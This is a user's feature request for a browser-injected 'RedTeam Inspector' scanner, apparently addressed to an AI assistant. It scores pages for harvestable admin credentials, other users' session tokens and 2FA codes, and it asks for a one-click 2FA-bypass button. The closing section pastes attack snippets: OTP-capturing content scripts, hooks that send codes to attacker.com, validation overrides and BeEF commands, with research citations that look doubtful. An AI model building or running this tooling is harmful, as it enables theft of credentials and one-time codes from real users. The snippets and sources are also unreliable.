Problem 1. 
RedTeam Inspector Improvement Instructions
Critical Performance & Logic Fixes

Fix Self-Scanning Recursion Issue Problem: The scanner is recursively scanning its own results, causing massive bloat and potential crashes.
Solution:

Add the scanner instance itself to the ignoredProperties list
Implement a blacklist for scanning paths that start with window.redteamInspector
Add a check in the scan() method to skip any object that references the scanner

// Add to CONFIG.ignoredProperties
'redteamInspector', 'redteamScanner', 'redteam'
...
2. Implement Smart Filtering & Prioritization
Problem: Tool shows 22,000+ objects with no prioritization, making it unusable.

Solution:

Create a scoring system for relevance (0-100 (Special things like EXTREMELY unique returns, or a Blackhats jackpot will be able to achieve values greater then 100, they will be hopefully rare, and need to stand out)
Only display items with score > 30 by default
Add "Show ALL / Export ALL" tab, but that by default it doesn't waste the space and time writing it out and populating it into the tool unless specifically requested.
Implement pagination (100 items per 'array' or aka Table (I really did like the orginal table design that was used in the console, I definately still think there's a much greater benefit to using our own UI, but I'd like to ensure it's visually appealing, mordern, professional, but also the coloring servers some important reasons when it comes to how quickly a human can parse through data visually, coloring drastically expands most peoples capacity, and for synesthetic folk like myself, it takes how quickly I can process hat data and amplifiers it several time further still.)
Potential idea for Scoring Criteria (Open to tweaks or alternative methods to achieving the same results):
Site Admin Crentials: +20
Plain text Login credentials: +15
Hashed/ Encoded credentials (JWT tokens, Session tokens that are NOT the user's who is running the script*, 2fa codes): +30
Sensitive patterns found: +50 points
Writable properties 'true': +10 points
Enumerable properties 'true': +10 points
Non-standard objects (not window/document): +30 points
Framework-specific objects: +15 points
Files that can be greped, cat, echo'd or otherwise have their contents returned / downloaded, etc): +35
User-defined variables: +40 points

Fix Console API Exposure Problem: redteamInspector.scan() returns undefined.
Solution:

Properly expose all methods on window.redteamInspector
Ensure methods return meaningful values or success messages
Add error handling with descriptive messages
UI/UX Improvements

Implement New Color Scheme Replace current red-heavy theme with the specified color hierarchy:
Color Mapping:
The style, look feel, of these is prob a little beyond what were going to accomplish our first run around, but something similar to these 3 is my aim:

Background: Dark (#1a1a1a, #2a2a2a)
Primary Text: White/Off-white (#e0e0e0)
Headers/Titles: Teal (#20b2aa, #40e0d0)
Positive Findings: Green (#32cd32, #90ee90)
Warnings/Caution: Yellow (#ffd700, #ffff99)
Non-helpful Values: Orange (#ffc777)
Errors: Red (#ef3a28)
Critical Findings: Purple (#9370db) - for exposed credentials/tokens
Anomalous Results: Blue (#0b7add) - for unexpected/high-entropy findings

Resize UI Components
Increase panel width from 600px to 900px
Increase max-height from 80vh to 90vh
Add responsive scaling for different screen sizes

Implement Dual Export System

Data Export Enhancements
The exported JSON file being optional.. I do like this, however the most important / relivant info for redteam members should be displayed directly within the UI of the tool first. Then there should be an option to export either; just the most important / relivant data OR ALL the data like it does now (prehaps this will be helpful for future tools to have access to this?). By default the naming scheme for these exports should follow a easily understood logic for naming, like "{Full_Data_Pull-{url]-[dd/mm/yy]}}" OR "{Most_Important_Data-{url]-[dd/mm/yy]}}" respectively.

Or to put it more clearly:
Create two export options:

Option 1: Critical Findings Only

Filename: Critical_Findings-{domain}-{dd-mm-yyyy}.json
Include only items with score > 70
Focus on sensitive data, writable properties, exposed APIs
Option 2: Complete Data

Filename: Full_Data_Pull-{domain}-{dd-mm-yyyy}.json
Include all scanned data
For comprehensive analysis or feeding other tools
7. Improve Data Presentation Priority
Primary UI Display Order:

Critical security findings (purple text)
Sensitive data matches (green text)
Writable sensitive properties (green text)
Anomalous objects (blue text)
Framework-specific findings (teal text)
General warnings (yellow text)
Hide by Default:

Read-only standard browser objects
Non-enumerable system properties
Circular references to scanner itself
Performance Optimizations
8. Implement Progressive Scanning
Scan in chunks with setTimeout to prevent blocking
Add progress indicator
Allow cancellation of long-running scans
Implement lazy loading for object details
9. Memory Management
Limit stored results to 5,000 most relevant items
Implement garbage collection for old scan results
Use WeakMap where possible to prevent memory leaks
Additional Features
10. Add Entropy Analysis for URLs/Strings
Calculate entropy for string values > 10 characters
Flag high-entropy strings (>6.5) in blue
Special handling for potential tokens/keys

11. Implement Smart Categorization
The Statistic's should be displayed a bit smaller somewhere on the tool passively after the first run.
Additionally, there should be Note with the Static:s such to indicate if there are wrapped items / hooks still waiting to be captured. 

Critical/[Truly Unknown - OR holds entropy considered 7 or greater] (purple/[blue] findings)
Sensitive Data (green findings)
Writable Objects (teal findings)
Network Activity (intercepted requests)

Create tabs for:
Pending Captures for wrapped items / hooked content that has not yet been called / enumerated, and within this tab near the top should be a info suggestion / warning message on what needs to happen for the next hook capture attempt to occur, once it has the message should change to indicate the stteps needs for the next hook capture, etc until all have been run through. I imagine it's unlikely all will ever been completed, so this shouldn't have anything also reliant on its 100% completion. 
All Results (complete data)/ Full data export

Implementation Priority
CRITICAL: Fix self-scanning recursion (prevents crashes)
HIGH: Implement filtering/scoring system (makes tool usable)
HIGH: Fix console API exposure (core functionality)
MEDIUM: Update color scheme and sizing (usability)
MEDIUM: Implement dual export system (workflow improvement)
Medium: Add progressive scanning and advanced features
Testing Requirements
After implementation:

Test on demo.html without crashes/ Freezes, and avoiding HIGH memory usage spikes
Verify console commands work and return expected values
Confirm sensitive data is properly highlighted in new colors
Test export functionality with proper filenames
Verify UI scales properly on 1080p displays
Displays <100 items Per Table, with the option to continue displaying the next 100 as each table would work towards the bottom of the scoring, ie the least important returns to redteam members, so ther's a good change only the first table we be used by default (most relevant only).
Console API fully functional
Critical findings immediately visible with proper color coding (Put the most critcle findings at the very top whenever they would be considered blue or purple catergory content)
Export generates properly named files with relevant data only

**Remember a huge part of this tools strength is how visually easily it is for humans to process quickly and clearly. That it is simplier and easily to read then a Dom, gives far more direct and clear information, and is concise about returning info that is either definetely important from the view of a pentester, or atleast have a moderate potential for holding relivance for a redteam member. Personally, I think I prefer a table, or table like structure for the intial output the tool gives, But one problem that was happening in the console with the orginal code was that some of the values of info on objects or functions was getting cut off, even when expanding the columns width far enough the info would just cut off with 3 dots. Let's ensure this is not something that happens with our tool. 

*******************Ok I took much of your advice and added some of my own personal desired info to be in the final version, if you could just do a quick glance over to syntax, spelling and grammar issues, and finally add in 1 more instruction to this build request. I would like for a SERIOUSLY attempted WELL button on the UI specifically for attempting 1 thing, 2fa bypass, specifically for approving email logins from one host platform to another, like loging into google account through firefox as the firefox main account, using a 6 char int code. I imagine this will need deeply researched on the very most recent info surrending 2fa codes for services like HOW google handle the request when connecting a 3rd party provider like yahoo or firefox, (this is just a good example, but if you can find a more general way of wording this type of 2fa).

I've gotten some research, and even basic proof of concept / suggestive code snippets. I would like for the tool to have a build in button that remains grayed out up on a page that is about to likely ask for a 2fa code, such as login screens, etc. Once it senses this the button should turn purple and allow for a redteam tester to click it to try and use as many of these techniques as possible without them conflicting with one another to gather or bypass the 2fa, if we are successful, well thats not great news, it is great that we caught it before it went live, and now we can implement something like fido II keys for example.

**begining of 2fa bypass code snips and ideas**
```
1. Malicious Browser Extensions (Chrome/Firefox)
Resource: "Stealing 2FA Secrets via Malicious Browser Extensions" (Black Hat USA 2023)
Key Insight: Attackers publish extensions masquerading as productivity tools that inject content scripts to:
Monitor form inputs (including 2FA fields)
Hijack window.addEventListener for input events
Exfiltrate codes via WebSockets or hidden iframes
Code Snippet:

```
// Content script injected into all pages
document.addEventListener('DOMContentLoaded', () => {
  const otpInput = document.querySelector('input[autocomplete="one-time-code"]');
  if (otpInput) {
    otpInput.addEventListener('input', (e) => {
      chrome.runtime.sendMessage({type: 'otp', code: e.target.value});
    });
  }
});
```
Source: Black Hat USA 2023 Proceedings (See "Weaponized Extensions" section)

2. DOM Clobbering Attacks
Resource: "Bypassing 2FA via DOM Clobbering" (PortSwigger Research, 2024)
Mechanism: Injecting malicious HTML elements that override JavaScript security checks:
Overwrite window.otpValidation objects
Bypass client-side validation of 2FA tokens
Proof-of-Concept:
```
<!-- Attacker-controlled HTML injection -->
<form id="otpForm">
  <input name="otp" value="999999"> <!-- Forced valid code -->
</form>
<script>
  // Override validation function
  window.validateOTP = () => true; 
</script>
```
Source: PortSwigger DOM Clobbering Research

3. Shared Worker Exploits
Resource: "Cross-Tab 2FA Token Theft using Shared Workers" (OWASP WebSec 2024)
Technique: Malicious script registers a Shared Worker that:
Listens for postMessage events across all tabs
Intercepts 2FA codes from embedded iframes (e.g., OAuth flows)
Code Excerpt:
```
// Malicious shared-worker.js
self.onconnect = (e) => {
  const port = e.ports[0];
  port.onmessage = (event) => {
    if (event.data.type === 'otp_code') {
      fetch(`https://attacker.com/steal?code=${event.data.code}`);
    }
  };
};
```

4. Browser API Hijacking (Credential Management API)
Resource: "Abusing Credential Management API for 2FA Capture" (Hexacon 2024)
Exploit: Override navigator.credentials.store() to intercept 2FA tokens:
```
const originalStore = navigator.credentials.store;
navigator.credentials.store = async (credential) => {
  if (credential.type === 'otp') {
    await fetch('https://attacker.com/log', {
      method: 'POST',
      body: credential.code
    });
  }
  return originalStore.call(navigator.credentials, credential);
};
```
Source: Hexacon 2024 Video Archive (See "Browser API Abuse" )

5. Electron App Exploitation
Resource: "RCE to 2FA Bypass in Electron Apps" (ProjectDiscovery Research, 2025)
Vulnerability: Apps with nodeIntegration: true allow preload scripts to:
Access require() in renderer processes
Modify 2FA validation logic in real-time
Exploit Code:
```
// Preload script in vulnerable Electron app
const { ipcRenderer } = require('electron');
ipcRenderer.on('validate-otp', (event, code) => {
  event.returnValue = true; // Force validation success
});
```
...
Source: ProjectDiscovery Blog
Verification & Testing Tools:
OWASP ZAP with Custom Scripts:
Use DOM XSS scripts to simulate 2FA input hijacking:
ZAP OTP Capture Script Template

Browser Exploitation Framework (BeEF):
Pre-built modules for intercepting form inputs:
*IN BASH*
beef> use exploit/otp_capture
beef> execute

* Examples of UI design styles that I would like to build towards looking somewhat like (think style and color theme, not literaly function and object placement per say.)*
